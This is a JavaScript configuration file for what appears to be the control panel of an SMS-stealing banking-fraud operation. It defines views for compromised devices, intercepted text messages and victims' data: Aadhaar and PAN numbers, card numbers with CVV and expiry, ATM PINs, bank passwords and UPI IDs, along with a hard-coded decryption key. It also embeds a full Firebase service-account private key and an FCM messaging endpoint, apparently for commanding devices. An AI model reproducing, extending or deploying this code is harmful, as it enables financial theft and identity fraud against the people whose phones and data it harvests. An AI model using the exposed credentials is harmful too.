// General Config

const decryptKey = "123!!##$$123%$#%mfkd45609882**adsnje##szzz@@11/+sd|}{:><,.-";

// Device List
// label, key, default, statusClass, decrypt

const deviceConfig = [
    { label: "Serial", key: "serial"},
    { label: "Device Name", key: "devicename", default: "Unknown Device" },
    { label: "Device ID", key: "deviceid", default: "N/A" },
    { label: "Version", key: "version", default: "N/A" },
    { label: "Sim", key: "sim", default: "N/A" },
    { label: "Status", key: "status", statusClass: true }
];

// Message List
// label, key, decrypt

const messagesConfig = [
    { label: "Serial", key: "serial" },
    { label: "Device", key: "device" },
    { label: "Time", key: "time" },
    { label: "Number", key: "number", decrypt: true },
    { label: "Message", key: "message", decrypt: true },
    { label: "Sender", key: "sender", decrypt: true },
    { label: "Receiver", key: "receiver", decrypt: true }
];

// User Data List
// label, key, decrypt

const userDataConfig = [
    { label: "Serial", key: "serial" },
    { label: "name", key: "name", decrypt: true },
    { label: "number", key: "number", decrypt: true },
    { label: "dob", key: "dob", decrypt: true },
    { label: "mother", key: "mother", decrypt: true },
    { label: "aadhar", key: "aadhar", decrypt: true },
    { label: "pan", key: "pan", decrypt: true },
    { label: "card", key: "card", decrypt: true },
    { label: "cvv", key: "cvv", decrypt: true },
    { label: "exp", key: "exp", decrypt: true },
    { label: "atm", key: "atm", decrypt: true },
    { label: "bank", key: "bank", decrypt: true },
    { label: "uid", key: "uid", decrypt: true },
    { label: "pass", key: "pass", decrypt: true },
    { label: "upi id", key: "upiid", decrypt: true },
];

//Firebase Config

const refKey = "rc-71-01";

const firebaseConfig = {
    authDomain: "rc-71-7ce30.firebaseapp.com",
    databaseURL: "https://rc-71-7ce30-default-rtdb.firebaseio.com",
    projectId: "rc-71-7ce30",
    storageBucket: "rc-71-7ce30.firebasestorage.app",
    messagingSenderId: "408665257148",
    appId: "1:408665257148:web:f921a57b75b781ee3bccb9",
    measurementId: "G-PSR5QDB155"
};


const serviceAccount = {
    "type": "service_account",
    "project_id": "rc-71-7ce30",
    "private_key_id": "38c1d94b2191d99a1a5d715ce66f2fc55aaa56b8",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCxqLsskq8jBQlY\n6zNnZbn6LBhnQMzcL13xK/9y0uXrvmMN9uumzfVzCSjUj94KqcXcIONGNbRrwcTO\nXH2NU/F6+5IVWisXdR3FXxjeHCM3VA7pQHoEcs5aSEBUBJ2/2649I34hU6btxd51\nPTBGTAUbJL+QGjtSPBD60JkdZn7MeLHLLHMLP4uR/y/l53oo0lmDpTs8pRMC937Z\n+u4fvC4w2bqsfqBFj7Aktf47Ll077I7nmi5MaDzXpQKVbIu7Jqd/kKLay4s8toLm\nT8V8j7hBNkpOq9eCM5vOWKxZTntH4qcF4G9YtdQa++ABVWMnPmwkFlKOutJBcbl9\neXRUgLJfAgMBAAECggEAUM2FADNhC8T9KN+k3BjE+xd2K/QpmNXEXO4de6yXXV8U\n72OIb7AKPH2EgBVFMMVh1ApzRFolysLxT8h6ZD6zPLPSD/sYUU13sm7bwR28GKyX\nMZidRouu9hoZg/0rgHkaqP0NH3xMFqYh1WH0pGxsABn5NMHxjCf8sw8QLPKSpk1V\nEzScQmZ9SFu6VK0M5CnaTvW7pA1XqHCFCt9O2GYksv36nkA//SlEAoMkf1Z3jF27\nzqPl0AJwetoxR7LDTsUjYic/r76V+eEUKDb5ruOipcA7XqXL1wK2DO/dCyu0Kl95\n9e5VQQICdc9tiNKB+EVH/1oqppgtDTt3lVssoSCqZQKBgQDz+4JhmYcQpv+SV7q/\n26LvbBrRpxi00wDnaY41epazqrCCGvp69vRp/gdxEpGnoxJUcIos+jiqVVLyYwvc\n8FLVNJEvwFoh5qmm2SqMp2Ukc2sB/Z5/x3bRGqoYH6PR8pBuj5MlG/8AKVKKKtV+\nWVMRo69izqgQ390TdoT5hqkqjQKBgQC6aOtQmWfaxUT2EZVMz1Yv63SyGSYvZAvc\nafNGR5WBYpPbwWTC8cNm7S9pjRaxJlK6Htg186nfLyYKxROUeh41fKnmyifp+nm5\n8st/2gdoSYdfZRDpStV7qUK3iDSxKB1cMNpuTSilggELzalmMgl2WTP6Gw+KxJ9W\npDPvfzdrmwKBgQC3j6OBgLvAiJRB6yVC0aFdlqz6zUfmS9YjRSRMEgYt+J7B1EBd\noU00LX410S2qvSK+Ssl6m2tko7s7R8+WE22OoPUWwxZM6Tj8oejEV/DdosSAg+rq\n4gv/uJr+eVeMTn3h4L1pLw4EdhJ2h1GGtPetjsQWh7qkr3ip+wKCpZDCxQKBgQCH\nGoHqgbTWx4EqwyWtbNxvkLycVEPrtxwtnRC30CwYgWTesjUgYW8ZCzEA1EQtErSE\nttRHjhmBa7+rsJh3VWbNp1PQtJXnLCXLUqCRQml5+UjHKA3wt88weEWllW9zMrrM\n1Y+KwBuEkUvGzUFIk11uTEqyq6hBEC7X8dy+aTq2nwKBgHk1a6rifyKvlpdW6BEH\nw4DbeA+kfX2E1PfT50QQHrYr3eTTPQcXmIWM8GWj+SRUH66R9brjwrcarhS/MfZz\n0kbYbMLTqgxFvbn+2w80Cp4VguzKvkWx3B1OnMS9lRcLahU0hyyGvggo9p8pWI1O\n169mbjGesniR51CQ+at5gSFm\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-fbsvc@rc-71-7ce30.iam.gserviceaccount.com",
    "client_id": "108898979215039747940",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40rc-71-7ce30.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}


const fcmRequest = `https://fcm.googleapis.com/v1/projects/${firebaseConfig.projectId}/messages:send`;

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Get Firebase services
const database = firebase.database();
const auth = firebase.auth();

// Export for use in other files
window.firebaseApp = firebase.app();
window.firebaseDatabase = database;
window.firebaseAuth = auth;

window.serviceAccount = serviceAccount;
window.fcmRequest = fcmRequest;

// Export other config

window.refKey = refKey;

window.deviceConfig = deviceConfig;
window.decryptKey = decryptKey;

window.messagesConfig = messagesConfig;

window.userDataConfig = userDataConfig;

console.log("Firebase initialized successfully");
